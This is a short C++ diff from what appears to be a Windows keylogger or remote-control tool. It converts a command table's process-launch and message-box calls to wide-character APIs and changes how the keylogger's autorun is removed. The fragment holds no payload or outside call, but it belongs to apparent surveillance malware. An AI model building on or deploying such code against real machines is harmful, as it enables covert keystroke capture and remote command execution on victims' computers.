@@ -43,7 +43,7 @@ command_t commandDefs[] = {
 
             si.cb = sizeof(si);
 
-            CreateProcess(NULL, dest, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+            CreateProcessW(NULL, dest, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
         }
     },
     {
@@ -54,7 +54,7 @@ command_t commandDefs[] = {
             std::string msgboxText = join_at_index(args, " ");
             wchar_t text[1024];
             mbstowcs(text, msgboxText.c_str(), 1024);
-            MessageBox(NULL, text, NULL, MB_OK);
+            MessageBoxW(NULL, text, NULL, MB_OK);
         }
     },
     {
@@ -65,7 +65,7 @@ command_t commandDefs[] = {
     },
     {
         "remove", [](std::vector<std::string> args) {
-            keylogger.RemoveAutorun();
+            keylogger.SetAutorun(false);
         }
     }
 };
